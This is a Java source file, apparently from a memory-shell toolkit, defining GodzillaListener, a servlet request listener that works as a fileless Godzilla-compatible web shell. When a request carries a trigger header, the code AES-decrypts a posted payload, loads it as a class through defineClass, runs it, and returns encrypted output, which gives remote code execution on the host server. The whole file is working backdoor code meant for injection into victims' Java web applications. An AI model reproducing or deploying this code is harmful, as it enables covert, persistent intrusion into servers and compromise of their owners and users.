package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;

/**
 * @author ReaJason
 */
public class GodzillaListener extends ClassLoader implements ServletRequestListener {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    public GodzillaListener() {
    }

    public GodzillaListener(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(pass));
                data = this.x(data, false);
                Object cache = session.getAttribute(key);
                if (cache == null) {
                    session.setAttribute(
                            key,
                            (new GodzillaListener(Thread.currentThread().getContextClassLoader())).Q(data));
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) cache).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    response.getWriter().write(md5.substring(0, 16));
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                    response.flushBuffer();
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = base64.newInstance();
            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }

    @SuppressWarnings("deprecation")
    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }
}
